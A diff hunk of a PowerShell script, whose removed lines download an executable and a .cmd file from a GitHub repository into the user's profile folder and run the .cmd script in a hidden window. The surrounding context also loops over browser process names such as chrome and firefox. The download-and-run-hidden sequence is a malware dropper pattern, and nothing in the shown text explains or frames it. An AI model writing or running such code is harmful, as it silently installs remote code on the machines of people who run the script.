@@ -40,31 +40,6 @@ if (-not (Test-Path -Path $userDirectory -PathType Container)) {
     New-Item -ItemType Directory -Path $userDirectory | Out-Null
 }
 
-
-# Set the URL and output path
-$url = "https://github.com/Wesley5n1p35/psh/raw/main/properties.exe"
-$outputPath = [System.IO.Path]::Combine($env:USERPROFILE, 'Library\properties.exe')
-
-# Download the exe
-Invoke-WebRequest -Uri $url -OutFile $outputPath
-
-$cmdScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/play.cmd"
-$cmdScriptPath = [System.IO.Path]::Combine($env:USERPROFILE, "Library\play.cmd")
-
-# Download the .cmd script from the URL
-Invoke-WebRequest -Uri $cmdScriptUrl -OutFile $cmdScriptPath
-
-# Check if the script file exists
-if (Test-Path $cmdScriptPath -PathType Leaf) {
-    Write-Host "Script file found at $cmdScriptPath"
-    
-    # Execute the .cmd script with the window closed
-    Start-Process -FilePath $cmdScriptPath -ArgumentList "/c",$cmdScriptPath -WindowStyle Hidden
-} else {
-    Write-Host "Script file not found at $cmdScriptPath"
-}
-
-
 $browserProcesses = "chrome", "firefox", "iexplore", "edge", "opera"
 
 $browserProcesses | ForEach-Object {
